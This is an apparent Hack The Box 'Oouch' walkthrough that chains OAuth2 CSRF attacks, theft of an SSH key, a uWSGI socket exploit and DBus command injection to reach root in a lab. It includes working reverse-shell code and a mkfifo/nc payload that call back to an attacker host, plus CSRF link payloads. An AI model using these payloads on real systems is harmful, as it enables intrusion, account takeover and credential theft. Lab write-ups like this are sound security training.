# HTB Oouch - Comprehensive Walkthrough

**Target IP:** `10.129.29.195`  
**Attacker IP:** `10.10.14.6`  
**Difficulty:** Hard  
**Category:** Linux / OAuth2 / CSRF / Docker Escape / DBus Command Injection

---

## Table of Contents

1. [Philosophy: The Hacker Mindset for This Box](#philosophy-the-hacker-mindset-for-this-box)
2. [Initial Reconnaissance](#initial-reconnaissance)
3. [Understanding the OAuth2 Architecture](#understanding-the-oauth2-architecture)
4. [Step 1: Account Registration on Both Services](#step-1-account-registration-on-both-services)
5. [Step 2: CSRF #1 - Hijacking the Admin Account on the Consumer](#step-2-csrf-1---hijacking-the-admin-account-on-the-consumer)
6. [Step 3: Escalation to qtc and Document Discovery](#step-3-escalation-to-qtc-and-document-discovery)
7. [Step 4: Registering a Malicious OAuth Application](#step-4-registering-a-malicious-oauth-application)
8. [Step 5: CSRF #2 - Stealing the Admin's Authorization Code](#step-5-csrf-2---stealing-the-admins-authorization-code)
9. [Step 6: Exchanging the Code for an Access Token](#step-6-exchanging-the-code-for-an-access-token)
10. [Step 7: Retrieving the SSH Key](#step-7-retrieving-the-ssh-key)
11. [Step 8: User Flag](#step-8-user-flag)
12. [Step 9: Post-User Enumeration - Discovering Docker Containers](#step-9-post-user-enumeration---discovering-docker-containers)
13. [Step 10: Pivoting into the Consumer Container](#step-10-pivoting-into-the-consumer-container)
14. [Step 11: Exploiting uWSGI for www-data](#step-11-exploiting-uwsgi-for-www-data)
15. [Step 12: DBus Command Injection to Root](#step-12-dbus-command-injection-to-root)
16. [Step 13: Root Flag](#step-13-root-flag)
17. [Key Takeaways](#key-takeaways)

---

## Philosophy: The Hacker Mindset for This Box

Before we touch a single command, let's understand **why** this box exists and what mental models you need.

**Oouch is an OAuth2 teaching machine.** The creator (`qtc`) built it to demonstrate that even "secure" modern authentication protocols can be completely compromised by missing a single CSRF token or by trusting user input in a backend service.

### The Hacker Mindset You Need Here:

1. **Think in flows, not pages.** OAuth2 is not a single webpage you can attack in isolation. It's a *conversation* between three parties: the consumer app, the authorization server, and the user (or admin bot). Your goal is to find the weakest link in that conversation.

2. **Trust boundaries are everything.** The consumer app trusts the authorization server. The authorization server trusts the user's browser. The admin bot trusts the contact form. Every time you see trust, ask: *"What if I insert myself into this trust relationship?"*

3. **CSRF is not dead.** Modern frameworks make CSRF harder, but OAuth2 implementations often forget to validate `state` parameters or CSRF tokens on cross-site redirects. If you can make an admin's browser send a request you crafted, you win.

4. **Containers are not magic security.** Docker separates processes, but if a container can talk to a host service (like DBus) and that service runs as root and trusts input from the container... the container boundary collapses.

5. **Sockets are files, and files have permissions.** The uWSGI socket was world-writable (`srw-rw-rw-`). That means *any* user on the system — even inside a container — can write to it and impersonate the web server.

---

## Initial Reconnaissance

### Why Recon Matters

You cannot attack what you do not understand. Before we exploit anything, we need to know:
- What services are running?
- What do they do?
- What hints are they giving us?

### Step 0.1: Port Scan

```bash
nmap -p- -sC -sV 10.129.29.195
```

**What this does:**  
`-p-` scans all 65,535 TCP ports. `-sC` runs default NSE scripts. `-sV` performs version detection.

**Why we do this:**  
We want the full attack surface. A "quick" scan might miss non-standard ports. Oouch runs HTTP on 5000 and 8000 — both non-standard.

**Expected output:**
```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2
5000/tcp open  http    nginx 1.14.2
8000/tcp open  rtsp
```

**Hacker Mindset:**  
> "Four ports. FTP might have anonymous access. SSH is probably key-only. Two HTTP ports means two applications. The machine name is 'Oouch' — that sounds like 'Ouch' or maybe 'OAuth'? Let's keep that hypothesis in mind."

### Step 0.2: Anonymous FTP

```bash
ftp 10.129.29.195
```

Login: `anonymous` / any password

```ftp
ls
get project.txt
quit
```

**What this does:**  
Many FTP servers allow anonymous logins for public file distribution. Developers sometimes leave hints or files here.

**Why we do this:**  
It's the lowest-hanging fruit. If we can get files without credentials, we should do it immediately.

**Content of `project.txt`:**
```
Flask -> Consumer
Django -> Authorization Server
```

**Hacker Mindset:**  
> "Flask is a Python micro-framework. Django is a Python web framework. The terms 'Consumer' and 'Authorization Server' are OAuth2 terminology. This confirms our hypothesis: this box is about OAuth2. Port 5000 is probably Flask (consumer app). Port 8000 is probably Django (auth server)."

### Step 0.3: Adding Hosts to /etc/hosts

```bash
echo "10.129.29.195 oouch.htb consumer.oouch.htb authorization.oouch.htb" | sudo tee -a /etc/hosts
```

**What this does:**  
Web applications often use virtual hosts (vhosts) to serve different content based on the `Host` header. Without these DNS entries, your browser won't know where to send requests for those hostnames.

**Why we do this:**  
When we eventually see redirects to `consumer.oouch.htb` or `authorization.oouch.htb`, our system needs to resolve them. If we skip this, we'll get connection errors later and waste time debugging.

**Hacker Mindset:**  
> "The application is telling me its own name. I need to make sure my system speaks the same language. OAuth2 relies heavily on redirects between domains. If I can't resolve those domains, I can't follow the authentication flow."

---

## Understanding the OAuth2 Architecture

Before attacking, we need to understand the three actors:

### 1. The Consumer Application (Flask, port 5000)
This is the website the user interacts with. It wants to offer "Login with OAuth" functionality.

### 2. The Authorization Server (Django, port 8000)
This server authenticates users and issues authorization codes + access tokens.

### 3. The Resource Server
Usually the same machine as the authorization server. It holds user data (profile info, SSH keys, etc.). API endpoints like `/api/get_user` and `/api/get_ssh` live here.

### The Normal OAuth2 Flow (simplified):
1. User clicks "Connect Account" on consumer.
2. Consumer redirects user to auth server with `client_id`, `redirect_uri`, `scope`, `response_type=code`.
3. User logs into auth server and clicks "Authorize".
4. Auth server redirects user back to consumer's `redirect_uri` with an `?code=...` parameter.
5. Consumer's backend exchanges `code` + `client_secret` for an `access_token`.
6. Consumer uses `access_token` to query user data from the resource server.

**The attack surface lives in steps 3-4.** If the auth server doesn't validate CSRF tokens, we can skip the "Authorize" button step. If the consumer doesn't validate a `state` parameter, we can trick users into linking their accounts to our OAuth account.

---

## Step 1: Account Registration on Both Services

### Consumer App (Port 5000)

Visit: `http://consumer.oouch.htb:5000/register`

- Register a username like `testuser` with a password.
- Log in.
- Explore the interface: Menu, Profile, Documents, About, Contact.

**What you learn:**
- `/documents` says "administrators only."
- `/contact` has a form that says messages are forwarded to the system administrator.
- `/profile` shows "Connected Accounts" — currently none.
- `/oauth` exists (found via Gobuster or linked from profile).

**Hacker Mindset:**  
> "There's an admin account. I can't access `/documents`. The contact form talks to an admin bot. The OAuth page lets me connect accounts. This is a setup for a CSRF attack: I need to make the admin bot perform an action on my behalf."

### Authorization Server (Port 8000)

Visit: `http://authorization.oouch.htb:8000/signup/`

- Register a username like `testauth` with a password.
- Log in.
- Note the SSH fields during registration — these will be important later.

**Hacker Mindset:**  
> "The auth server asks for SSH information during signup. OAuth2 consumers can request user data via APIs. If I can get an access token for an admin, I might be able to retrieve their SSH key through an API endpoint. I'm already thinking ahead to the user-shell phase."

---

## Step 2: CSRF #1 - Hijacking the Admin Account on the Consumer

### The Vulnerability

When you click "Connect Account" on the consumer, it redirects to the auth server. After you authorize, the auth server redirects back to:
```
http://consumer.oouch.htb:5000/oauth/connect/token?code=XXXXXXXX
```

The consumer receives this request and links the *currently logged-in user* to the OAuth account that generated the code.

**The problem:** There is no `state` parameter validation. If we can make the admin bot send this request while logged into the consumer as `qtc`, the admin's `qtc` account will be linked to *our* `testauth` OAuth account.

### Step 2.1: Intercept the OAuth Connection Flow

1. Make sure you're logged into both consumer (`testuser`) and auth server (`testauth`).
2. Turn on Burp Suite intercept (or any HTTP proxy).
3. Visit `http://consumer.oouch.htb:5000/oauth/connect`.
4. Forward requests until you see the authorize page on the auth server.
5. Click "Authorize" on the auth server page.
6. In your proxy, you'll see a POST to `/oauth/authorize/...` — forward it.
7. The **next** request is the critical one:
   ```
   GET /oauth/connect/token?code=3swBqy03xWYONlt2T5Rh54jjDhglAY HTTP/1.1
   Host: consumer.oouch.htb:5000
   ```
   **DROP this request.** Do not let it reach the server.
   **Copy the full URL.**

**Why we drop it:**  
If we let this request complete, *our* `testuser` account will be linked to our `testauth` account. That's useless. We want the admin bot to send this request instead, so the admin's account gets linked to our OAuth account.

**Hacker Mindset:**  
> "I'm not the target — the admin is. I need to steal this callback URL and feed it to the admin bot. This is like intercepting a package and re-routing it to a different recipient. The package (the authorization code) is tied to my OAuth account, but the recipient (the consumer session) needs to be the admin's."

### Step 2.2: Weaponize the Contact Form

Visit `http://consumer.oouch.htb:5000/contact` while logged in as `testuser`.

Paste this into the message box:
```html
<a href="http://consumer.oouch.htb:5000/oauth/connect/token?code=YOUR_CODE_HERE">click me</a>
```

Submit the form.

**What happens:**  
The admin bot (running as user `qtc` on the consumer app) receives your message, extracts URLs, and visits them using `python-requests`. When it clicks your link, it sends the OAuth connection request with *its own session cookie*. The consumer app links the admin's `qtc` account to your `testauth` OAuth account.

**Why this works:**  
The consumer app doesn't verify that the request came from the auth server's redirect flow. It just sees a valid code and a valid session cookie, and links them together.

**Hacker Mindset:**  
> "The contact form is an SSRF (Server-Side Request Forgery) vector. The admin bot is a browser that follows links. I'm feeding it a link that performs a sensitive action on its behalf. This is classic CSRF — the admin is tricked into performing an action they didn't intend."

### Step 2.3: Login as qtc

Wait 1-2 minutes for the admin bot to click the link.

Then visit: `http://consumer.oouch.htb:5000/oauth/login`

Click "Authorize" when prompted. You are now logged in as `qtc`.

Visit `/profile` to confirm:
```
Hello qtc!
```

**Hacker Mindset:**  
> "I didn't steal the admin's password. I didn't break the password hash. I simply convinced the system that the admin wanted to link their account to my OAuth account. Now I inherit all of the admin's privileges on the consumer app. This is identity theft via protocol abuse."

---

## Step 3: Escalation to qtc and Document Discovery

Now that you're `qtc`, visit `/documents`.

You see three files:

### `dev_access.txt`
```
develop:supermegasecureklarabubu123! -> Allows application registration.
```

### `o_auth_notes.txt`
```
/api/get_user -> user data.
oauth/authorize -> Now also supports GET method.
```

### `todo.txt`
```
Chris mentioned all users could obtain my ssh key. Must be a joke...
```

**What this tells us:**
1. We have developer credentials for the auth server.
2. There's an API endpoint `/api/get_user` for retrieving user data.
3. The `/oauth/authorize` endpoint supports GET — meaning we can send it as a clickable link (no POST required).
4. SSH keys are accessible via the API.

**Hacker Mindset:**  
> "The developer credentials let me register new OAuth applications. The GET support on `/oauth/authorize` means I can perform another CSRF attack via the contact form. And the todo is a hint — SSH keys are stored on the auth server and retrievable via API. I'm looking at a clear path to shell access."

---

## Step 4: Registering a Malicious OAuth Application

Visit: `http://authorization.oouch.htb:8000/oauth/applications/register/`

You'll get an HTTP Basic Auth prompt. Login with:
- Username: `develop`
- Password: `supermegasecureklarabubu123!`

Fill out the form:
- **Name:** `evilapp` (or anything)
- **Client type:** Confidential
- **Authorization grant type:** Authorization code
- **Redirect URIs:** `http://10.10.14.6/token`

Save it. You'll receive a **Client ID** and **Client Secret**. Write these down.

**Why we do this:**  
We need our own OAuth application so we can control the `redirect_uri`. When the auth server redirects to `http://10.10.14.6/token`, the authorization code will be sent to our Kali machine instead of the legitimate consumer app.

**Hacker Mindset:**  
> "I'm registering myself as a legitimate third-party application. The auth server doesn't know I'm an attacker — I have valid developer credentials. By setting the redirect URI to my own IP, I'm positioning myself to intercept the most sensitive token in the OAuth flow: the authorization code that grants access to user data."

---

## Step 5: CSRF #2 - Stealing the Admin's Authorization Code

### The Goal

We want the admin bot (logged into the auth server as `qtc`) to authorize our malicious app. This will redirect to our Kali machine with an authorization code that grants us access to qtc's data.

### The Crafted Link

Using your **Client ID**, build this URL:
```
http://authorization.oouch.htb:8000/oauth/authorize/?client_id=YOUR_CLIENT_ID&response_type=code&redirect_uri=http://10.10.14.6/token&scope=read&state=&allow=Authorize
```

**Key parameters:**
- `client_id`: Your malicious app's ID.
- `redirect_uri`: Must match exactly what you registered.
- `allow=Authorize`: Skips the confirmation page and immediately issues the code.
- `state=`: Empty, because we don't care about CSRF protection for this attack.

### Execution

1. Start a listener on Kali:
   ```bash
   sudo nc -lvnp 80
   ```
   *(Port 80 is used because our redirect URI is `http://10.10.14.6/token` — no port specified means port 80.)*

2. Submit the link via the contact form:
   ```html
   <a href="http://authorization.oouch.htb:8000/oauth/authorize/?client_id=YOUR_CLIENT_ID&response_type=code&redirect_uri=http://10.10.14.6/token&scope=read&state=&allow=Authorize">click me</a>
   ```

3. Wait 1-2 minutes.

4. In your `nc` listener, you'll see:
   ```
   GET /token?code=Z0neGTs2TBUQvRVevKk7Ad7EkloyHs HTTP/1.1
   Host: 10.10.14.6
   User-Agent: python-requests/2.21.0
   ```

**Copy the `code` value immediately.** These codes expire quickly (usually within minutes).

**Why this works:**  
The auth server's `/oauth/authorize` endpoint supports GET requests and doesn't validate CSRF tokens properly. When the admin bot (already authenticated to the auth server) clicks the link, the auth server sees a valid session and immediately issues an authorization code for our app to access qtc's data.

**Hacker Mindset:**  
> "This is the second time I'm abusing the contact form. The first CSRF hijacked the admin's identity on the consumer app. This second CSRF hijacks the admin's authorization on the auth server itself. I'm chaining two CSRF vulnerabilities to escalate from an anonymous user to having an authorization token for the admin's most sensitive data."

---

## Step 6: Exchanging the Code for an Access Token

The authorization code alone is useless. We need to exchange it for an access token using our app's `client_id` and `client_secret`.

```bash
curl -s http://authorization.oouch.htb:8000/oauth/token/ \
  -d "grant_type=authorization_code" \
  -d "code=Z0neGTs2TBUQvRVevKk7Ad7EkloyHs" \
  -d "redirect_uri=http://10.10.14.6/token" \
  -d "client_id=YOUR_CLIENT_ID" \
  -d "client_secret=YOUR_CLIENT_SECRET" | jq .
```

**Expected output:**
```json
{
  "access_token": "ugv1Vp1kMQ2yaA9jfsr8lsp5jFsZnA",
  "expires_in": 600,
  "token_type": "Bearer",
  "scope": "read",
  "refresh_token": "gODVLIBbqZiT3KduqTSuvWZay6blNH"
}
```

**Why we do this:**  
The access token is the actual key that unlocks the resource server APIs. The authorization code was just a temporary voucher.

**Hacker Mindset:**  
> "I now have a Bearer token that represents the admin's identity on the auth server. With this token, I can query any API endpoint that the admin has access to. I'm no longer attacking the web application — I'm now an authenticated API client with the admin's privileges."

---

## Step 7: Retrieving the SSH Key

The documents hinted at `/api/get_user`, but the todo mentioned SSH keys. Let's try `/api/get_ssh`:

```bash
curl -s http://authorization.oouch.htb:8000/api/get_ssh \
  -H "Authorization: Bearer ugv1Vp1kMQ2yaA9jfsr8lsp5jFsZnA" | jq -r '.ssh_key' > id_rsa_qtc
```

Set proper permissions and SSH in:
```bash
chmod 600 id_rsa_qtc
ssh -i id_rsa_qtc qtc@10.129.29.195
```

**What this does:**  
The `Authorization: Bearer` header tells the resource server who we are. The server returns qtc's SSH private key, which was stored during registration on the auth server.

**Why this works:**  
OAuth2 scopes define what data an app can access. The `read` scope apparently includes SSH key data. The API endpoint `/api/get_ssh` was designed to let consumer applications retrieve SSH credentials for automation purposes.

**Hacker Mindset:**  
> "API enumeration is just like directory enumeration, but for endpoints. `/api/get_user` gave me profile data. I guessed `/api/get_ssh` based on the todo hint and the registration form fields. Always fuzz or guess API endpoints once you have a valid token."

---

## Step 8: User Flag

Once logged in as `qtc`:

```bash
cat ~/user.txt
```

**Flag:** `838d5[redacted]dc8b3f49c`

**Hacker Mindset:**  
> "I didn't brute-force a password. I didn't exploit a buffer overflow. I abused the design of the OAuth2 protocol itself — specifically, missing CSRF protections and overprivileged API endpoints. This is a logical exploit chain, and it's often more powerful than technical exploits because it bypasses traditional security controls like firewalls and IDS."

---

## Step 9: Post-User Enumeration - Discovering Docker Containers

As `qtc`, check network interfaces:

```bash
ip a
```

**What you see:**
- `ens160`: The main external interface (10.129.29.195).
- `docker0`: Docker's default bridge (172.17.0.1/16).
- `br-325e0b39713a`: A custom Docker bridge (172.18.0.1/16).
- Multiple `veth*` interfaces: Virtual Ethernet pairs connecting containers to the bridge.

**Why this matters:**  
The web applications (ports 5000 and 8000) are running inside Docker containers, not directly on the host. The host is just a Docker host.

Check for container IPs:
```bash
for ip in 172.18.0.{2..5}; do
  echo -n "$ip: "
  timeout 1 bash -c "echo > /dev/tcp/$ip/22" 2>/dev/null && echo "SSH OPEN" || echo "closed"
done
```

**What you find:**  
`172.18.0.4` has SSH open.

**Hacker Mindset:**  
> "The presence of Docker means the attack surface is larger than just the host. Containers often have different users, different configurations, and sometimes even different vulnerabilities. SSH being open on a container is unusual — it suggests the container is meant to be accessed by developers or by the host for maintenance."

Also check the note in qtc's home:
```bash
cat ~/.note.txt
```

**Output:**
```
Implementing an IPS using DBus and iptables == Genius?
```

**What this tells us:**  
There's a DBus-based IPS (Intrusion Prevention System) running. DBus is an inter-process communication system. If we can talk to it, we might be able to interact with a root-owned process.

Check the DBus config:
```bash
cat /etc/dbus-1/system.d/htb.oouch.Block.conf
```

**What you see:**
```xml
<policy user="root">
    <allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
    <allow send_destination="htb.oouch.Block"/>
    <allow receive_sender="htb.oouch.Block"/>
</policy>
```

**Critical insight:**  
- The DBus service `htb.oouch.Block` is **owned by root**.
- The user `www-data` is allowed to send messages to it.

**But wait** — there is no `www-data` user on the *host*. The `www-data` user exists **inside the consumer container**. This means we need to get a shell as `www-data` inside the container to talk to this DBus service.

**Hacker Mindset:**  
> "This is a privilege escalation bridge. The host has a root-owned DBus service that accepts messages from www-data. But www-data doesn't exist on the host — only inside the container. This means the container is intentionally allowed to talk to a root service on the host. If I can become www-data inside the container, I can send commands to root."

---

## Step 10: Pivoting into the Consumer Container

From the host (`qtc@oouch`), SSH into the consumer container:

```bash
ssh qtc@172.18.0.4
```

Check the application code:
```bash
ls -la /code/
cat /code/uwsgi.ini
```

**Contents of `uwsgi.ini`:**
```ini
[uwsgi]
module = oouch:app
uid = www-data
gid = www-data
master = true
processes = 10
socket = /tmp/uwsgi.socket
chmod-sock = 777
vacuum = true
die-on-term = true
```

**Key finding:**  
The uWSGI socket is at `/tmp/uwsgi.socket` and has permissions `777` (world-writable).

**What is uWSGI?**  
uWSGI is a gateway between the web server (nginx) and the Python application. It listens on a Unix socket and forwards HTTP requests to the Flask app. Normally, only nginx should be able to write to this socket.

**Why `777` is catastrophic:**  
Any user on the system — including `qtc` inside the container — can write to this socket. If we craft a valid uWSGI request, the uWSGI master process will execute it as the configured user: `www-data`.

**Hacker Mindset:**  
> "A world-writable socket is a world-writable file that executes code. If I can speak the uWSGI protocol, I can make the uWSGI server run any command I want — as www-data. This is not a vulnerability in uWSGI itself; it's a configuration vulnerability. Someone set `chmod-sock = 777` for convenience and created a privilege escalation path."

---

## Step 11: Exploiting uWSGI for www-data

### The Theory

uWSGI communicates over a binary protocol. If we can craft a valid uWSGI packet, we can:
1. Set environment variables like `SCRIPT_NAME`, `PATH_INFO`, etc.
2. Inject Python code or shell commands.
3. Execute them as the user running uWSGI (`www-data`).

We use a public exploit script: `uwsgi_exp.py`

### Preparation

On Kali, download and fix the exploit:
```bash
curl -sL https://raw.githubusercontent.com/wofeiwo/webcgi-exploits/master/python/uwsgi_exp.py > uwsgi_exp.py
sed -i 's/if sys.version_info\[0\] == 3: import bytes//' uwsgi_exp.py
```

Create a Python reverse shell:
```bash
cat > rev.py << 'EOF'
import os,pty,socket
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("172.18.0.1",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pty.spawn("/bin/bash")
EOF
```

Transfer files to host, then to container (or use base64 encoding if scp fails).

### Execution

**Terminal 1 (Host):** Start the catcher:
```bash
nc -nlvp 4444
```

**Terminal 2 (Container):** Fire the exploit:
```bash
cd /tmp
python uwsgi_exp.py -m unix -u /tmp/uwsgi.socket -c 'python /tmp/rev.py'
```

**What happens:**  
The exploit writes a crafted uWSGI packet to the socket. The uWSGI master process parses it and executes our Python reverse shell. The shell connects back to the host's Docker bridge IP (`172.18.0.1`) on port 4444.

**In Terminal 1, you get:**
```
connect to [172.18.0.1] from (UNKNOWN) [172.18.0.4] 52612
bash: /root/.bashrc: Permission denied
www-data@1201393c995b:/code$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Hacker Mindset:**  
> "I turned a configuration mistake (world-writable socket) into code execution as a different user. This is local privilege escalation inside the container. The uWSGI master process is essentially a command execution service listening on a file. Since the file has no access controls, anyone can use the service."

---

## Step 12: DBus Command Injection to Root

### The Theory

From the host's DBus config, we know:
- The service `htb.oouch.Block` runs as **root**.
- The user `www-data` (inside the container) can send messages to it.

The consumer app's source code (in `/code/oouch/routes.py`) shows how the app interacts with DBus:
```python
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
response = block_iface.Block(client_ip)
```

When someone submits XSS to the contact form, the app calls `block_iface.Block(client_ip)` to block their IP via iptables.

**The vulnerability:**  
The root-owned DBus service takes a string (the IP address) and likely executes it in a shell command like:
```bash
iptables -A INPUT -s [USER_INPUT] -j DROP
```

If we can control `[USER_INPUT]`, we can inject arbitrary shell commands.

### Execution

**Terminal 3 (Host):** Start the root shell catcher:
```bash
nc -nlvp 4445
```

**Terminal 1 (www-data shell in container):** Send the malicious DBus message:
```bash
dbus-send --print-reply --system --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | nc 172.18.0.1 4445 >/tmp/f;"
```

**What happens:**  
The DBus service receives our string. Instead of a valid IP like `10.10.14.6`, it receives a shell command with semicolons. Because the service likely uses unsafe string concatenation or `os.system()`, it executes our entire payload as root.

The payload:
1. Removes `/tmp/f` if it exists.
2. Creates a named pipe at `/tmp/f`.
3. Starts an interactive shell (`/bin/sh -i`) reading from the pipe.
4. Connects stdin/stdout/stderr to `nc 172.18.0.1 4445`.

**In Terminal 3, you get:**
```
connect to [172.18.0.1] from (UNKNOWN) [10.129.29.195] 42370
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

**Hacker Mindset:**  
> "This is the final bridge. The container was supposed to be isolated, but DBus is a shared resource between the container and the host. The root-owned DBus service trusted input from the container's www-data user. By injecting a shell command where an IP address was expected, I turned a 'block this IP' feature into a 'give me a root shell' feature. This is command injection — the most classic vulnerability in existence — hiding inside a modern inter-process communication system."

---

## Step 13: Root Flag

As root:

```bash
cat /root/root.txt
```

**Flag:** `9718ae30[redacted]96f133b`

---

## Key Takeaways

### Technical Lessons

1. **OAuth2 without CSRF protection is broken.** Both the consumer and the auth server lacked proper `state` parameter validation, allowing us to chain two CSRF attacks to hijack an admin account and steal their authorization code.

2. **API endpoints leak sensitive data.** The `/api/get_ssh` endpoint returned private SSH keys. API design should follow the principle of least privilege — if an endpoint isn't needed, don't expose it.

3. **World-writable sockets are code execution.** The uWSGI socket at `777` permissions allowed any user to inject commands into the web server process.

4. **DBus services can be command injection vectors.** Any service that constructs shell commands from user input is vulnerable, regardless of whether it uses HTTP, SQL, or DBus.

5. **Containers share resources with the host.** DBus sockets, kernel interfaces, and network bridges can all be bridges out of a container if not properly isolated.

### Methodological Lessons

1. **Follow the trust chain.** OAuth2 is about trust delegation. Find where trust is assumed and question it.

2. **Read the source code (or infer it).** The todo.txt hinted at SSH keys. The note.txt hinted at DBus. The `uwsgi.ini` showed the socket permissions. Configuration files are often more valuable than exploits.

3. **Be patient with bots.** The contact form bot took 1-2 minutes to click links. In real engagements, automated processes (cron jobs, email parsers, message queues) often have delays.

4. **Pivot through the host.** When direct connections from a container to your machine fail, use the compromised host as a pivot point. It's almost always on the same network as the containers.

### The Complete Chain

```
Anonymous FTP -> OAuth2 CSRF #1 (consumer) -> Login as qtc
    -> Developer creds -> Malicious app registration
    -> OAuth2 CSRF #2 (auth server) -> Authorization code
    -> Access token -> /api/get_ssh -> SSH as qtc
    -> Docker container discovery -> SSH into consumer container
    -> uWSGI socket exploit -> www-data shell
    -> DBus command injection -> Root shell
```

This is Oouch: a box that teaches you that modern authentication protocols, containerization, and inter-process communication are all just attack surfaces waiting to be understood.
